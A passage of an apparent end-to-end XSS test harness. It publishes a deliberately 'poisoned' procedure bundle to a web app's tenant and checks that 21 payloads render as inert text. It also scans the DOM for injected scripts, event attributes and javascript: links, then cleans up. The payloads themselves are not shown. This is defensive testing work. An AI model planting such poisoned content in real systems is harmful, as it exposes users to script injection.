    if (!Array.isArray(rows) || rows.length === 0) throw new Error(`blocker "${named}" not found for retirement`);
    const retire = await fetch(`${supabaseUrl}/functions/v1/upsert-sop`, {
      method: 'POST',
      headers: functionHeaders(editor.token),
      body: JSON.stringify({ sopId: rows[0].id, status: 'retired' }),
    });
    if (!retire.ok) throw new Error(`blocker retirement refused: HTTP ${retire.status}`);
    unblocked = { sopId: rows[0].id, title: named };
    pub = await publishAs(publisher.token);
  }
  if (!pub.ok) {
    throw new Error(`publish refused: HTTP ${pub.status} ${JSON.stringify(pub.body).slice(0, 300)}`);
  }
  // The expected serving count is READ, not assumed: it is whatever the
  // tenant holds published after our publish (blocker retired or never there).
  const expectedServing = await publishedCount(publisher.token);
  process.stdout.write(
    `==> published bundle v${pub.body.bundleVersion}, published procedures now ${expectedServing}, wrappedFor=${pub.body.wrappedFor}\n`,
  );
  check('poisoned bundle published', pub.ok === true);
  cleanupState.unblocked = unblocked;

  // ------------------------------------------------------- 7. serve --
  await send('Page.navigate', { url: `http://127.0.0.1:${STATIC_PORT}/` }, sessionId);
  await waitForTrue(
    `!!document.querySelector('[data-testid="session-tenant"]')`,
    30_000,
    'session after reload',
  );
  await evaluate(`(${CLICK_TEXT})('Load model and build index')`);
  const servingText = await waitForText(
    `(()=>{const el=document.querySelector('[data-testid="bundle-state"]');` +
      `const t=el?el.textContent:'';return /procedure\\(s\\), signed for this tenant/.test(t)?t:'';})()`,
    300_000,
    'model load + poisoned bundle serving',
  );
  const servingCount = Number((servingText.match(/(\d+) procedure/) ?? [])[1] ?? NaN);
  check(
    'app serves the poisoned bundle (count matches the tenant publish)',
    servingCount === expectedServing,
    servingText.slice(0, 100),
  );

  // ------------------------------------------------------- 8. queries --
  // The serving panel turns ready when the bundle installs, but the SAME
  // button still says "Loading model…" until the embedding index is built. A
  // query click before that finds no "Find Answer" button at all — a race the
  // app wins and the harness must wait out, not a product defect.
  check(
    'model loaded and index built (Find Answer available)',
    await waitForTrue(
      `[...document.querySelectorAll('button')].some((b)=>(b.textContent||'').includes('Find Answer'))`,
      300_000,
      'Find Answer button',
    ),
  );
  const found = new Set();
  const failures = [];
  for (const proc of PROCEDURES) {
    // Doubling the trigger adds overlap without new shared vocabulary. The
    // margin slider itself is never touched: loosening it for green would be
    // faking the gate, per C7.
    const queries = [`${proc.w1} ${proc.w2}`, `${proc.w1} ${proc.w2} ${proc.w1}`];
    let outcome = 'none';
    for (const query of queries) {
      await evaluate(
        `(()=>{const ta=[...document.querySelectorAll('textarea')].find((t)=>` +
          `(t.placeholder||'').includes('customer'));` +
          `if(!ta) throw new Error('missing query box');` +
          `const d=Object.getOwnPropertyDescriptor(Object.getPrototypeOf(ta),'value');` +
          `d.set.call(ta,${JSON.stringify(query)});` +
          `ta.dispatchEvent(new Event('input',{bubbles:true}));return true;})()`,
      );
      await evaluate(`(${CLICK_TEXT})('Find Answer')`);
      // One poll distinguishes the two terminal states, so an escalation does
      // not burn a full answer timeout.
      const state = await waitForText(
        `(()=>{if([...document.querySelectorAll('h2')].some((h)=>h.textContent==='Matched Procedure'))return 'answer';` +
          `if([...document.querySelectorAll('h3')].some((h)=>h.textContent==='Escalated to a human'))return 'escalation';return '';})()`,
        90_000,
        `decision for ${proc.key} (${query})`,
      );
      if (state === 'answer' || state === 'escalation') {
        outcome = state;
        if (state === 'answer') break;
      } else {
        outcome = 'none';
        break;
      }
    }
    if (outcome !== 'answer') {
      failures.push(`${proc.key}: no answer rendered (last outcome: ${outcome}); payloads never reached the DOM`);
      continue;
    }

    // The RIGHT procedure answered: the Matched Procedure panel's own h3 must
    // carry this procedure's trigger word. The h2 lives in the panel's header
    // row, so closest('div') stops one level too shallow (the header has no
    // h3); the panel itself is the nearest div.bg-white ancestor.
    const h3text = await evaluate(
      `(()=>{const h2=[...document.querySelectorAll('h2')].find((h)=>h.textContent==='Matched Procedure');` +
        `if(!h2) return '';const panel=h2.closest('div.bg-white');` +
        `const h3=panel?panel.querySelector('h3'):null;return h3?h3.textContent:'';})()`,
    );
    if (!h3text.toLowerCase().includes(proc.w1)) {
      failures.push(`${proc.key}: answer panel is for another procedure (${h3text.slice(0, 60)})`);
      continue;
    }

    const rendered = await evaluate(`(()=>({
      h3: [...document.querySelectorAll('h3')].map((h)=>h.textContent).join('\\n'),
      summary: [...document.querySelectorAll('p')].map((p)=>p.textContent).join('\\n'),
      reply: [...document.querySelectorAll('textarea')].map((t)=>t.value).join('\\n'),
      evidence: [...document.querySelectorAll('ol li p')].map((p)=>p.textContent).join('\\n'),
    }))()`);
    const allText = `${rendered.h3}\n${rendered.summary}\n${rendered.reply}\n${rendered.evidence}`;
    for (const field of ['title', 'summary', 'reply']) {
      const payload = PAYLOADS[proc[field]];
      if (allText.includes(payload)) found.add(`${proc.key}:${field}`);
      else failures.push(`${proc.key}:${field} payload never rendered as text`);
    }

    // Execution + injection scan, diffed against the baseline.
    const scan = await evaluate(`Object.assign(${SCAN},{alerts:(window.__alertCalls||[]).length})`);
    const clean =
      scan.scripts === BASELINE.scripts &&
      scan.imgs === BASELINE.imgs &&
      scan.svgs === BASELINE.svgs &&
      scan.iframes === BASELINE.iframes &&
      scan.details === BASELINE.details &&
      scan.inputs === BASELINE.inputs &&
      scan.anchors === BASELINE.anchors &&
      scan.maths === BASELINE.maths &&
      scan.onAttrs === BASELINE.onAttrs &&
      scan.jsHrefs === BASELINE.jsHrefs &&
      scan.dataHrefs === BASELINE.dataHrefs &&
      scan.fired === false &&
      scan.alerts === 0 &&
      dialogOpened === 0;
    check(`${proc.key} renders inert (no execution, no injection)`, clean, JSON.stringify(scan));
    if (!clean) failures.push(`${proc.key}: DOM/execution scan dirty`);
  }

  for (const proc of PROCEDURES) {
    for (const field of ['title', 'summary', 'reply']) {
      if (
        !found.has(`${proc.key}:${field}`) &&
        !failures.some((f) => f.startsWith(`${proc.key}:${field}`))
      ) {
        failures.push(`${proc.key}:${field} presence unproven`);
      }
    }
  }
  check('all 21 payloads rendered as inert text', found.size === 21, `${found.size}/21`);
  check(
    'zero console errors and zero page exceptions',
    consoleErrors.length === 0,
    consoleErrors.slice(0, 2).join(' | ').slice(0, 200),
  );

  const failed = checks.filter((c) => !c.ok);
  if (failures.length > 0 || failed.length > 0) {
    process.stdout.write(`\nXSS CLIENT-PATH FAILED — ${failures.length} finding(s):\n`);
    for (const f of failures.slice(0, 25)) process.stdout.write(`  - ${f}\n`);
    process.exitCode = 1;
  } else {
    process.stdout.write('\nXSS CLIENT-PATH OK — 21/21 payloads inert through the real client path\n');
  }
} catch (error) {
  process.stdout.write(
    `\nXSS CLIENT-PATH FAILED — ${error instanceof Error ? error.message : String(error)}\n`,
  );
  process.exitCode = 1;
} finally {
  // ------------------------------------------------------- 9. cleanup --
  // Retire the poison through the status-only path (no body read, no content
  // rewrite) and republish, restoring the tenant's published set. Reported,
  // never silent; a shortfall fails the run rather than leaving a trap.
  try {
    if (cleanupState.authored.length === 0) {
      process.stdout.write('==> cleanup: nothing authored, nothing to retire\n');
    } else if (cleanupState.editorToken === null || cleanupState.publisherToken === null) {
      process.stdout.write('==> cleanup IMPOSSIBLE: sessions never provisioned — poisoned rows remain published\n');
      process.exitCode = 1;
    } else {
      let retired = 0;
      for (const sopId of cleanupState.authored) {
        const res = await fetch(`${supabaseUrl}/functions/v1/upsert-sop`, {
          method: 'POST',
          headers: functionHeaders(cleanupState.editorToken),
          body: JSON.stringify({ sopId, status: 'retired' }),
        });
        if (res.ok) retired += 1;
        else process.stdout.write(`  retire failed for one row: HTTP ${res.status}\n`);
      }
      // Restore the pre-existing blocker to exactly the status it held before
      // this run (published but unpublishable — the tenant's prior effective
      // state). Publishing now would 502 on it again, so no publish follows:
      // the published SET is what is restored, and the bundle version is
      // untouched by cleanup.
      let blockerRestored = true;
      if (cleanupState.unblocked !== null && cleanupState.unblocked !== undefined) {
        const restore = await fetch(`${supabaseUrl}/functions/v1/upsert-sop`, {
          method: 'POST',
          headers: functionHeaders(cleanupState.editorToken),
          body: JSON.stringify({ sopId: cleanupState.unblocked.sopId, status: 'published' }),
        });
        blockerRestored = restore.ok === true;
        process.stdout.write(
          `  pre-existing blocker "${cleanupState.unblocked.title}" restored to published: ${blockerRestored}\n`,
        );
      }
      const finalPublished = await publishedCount(cleanupState.publisherToken);
      const restored = finalPublished === cleanupState.prePublished;
      check(
        'cleanup: poison retired and published set restored',
        retired === cleanupState.authored.length && restored && blockerRestored,
        `retired ${retired}/${cleanupState.authored.length}, published now ${finalPublished} (was ${cleanupState.prePublished})`,
      );
      if (retired !== cleanupState.authored.length || !restored || !blockerRestored) {
        process.exitCode = 1;
      }
    }
  } catch (cleanupError) {
    process.stdout.write(
      `==> cleanup FAILED: ${cleanupError instanceof Error ? cleanupError.message : String(cleanupError)}\n`,
    );
    process.exitCode = 1;
  }
  killAll();
}
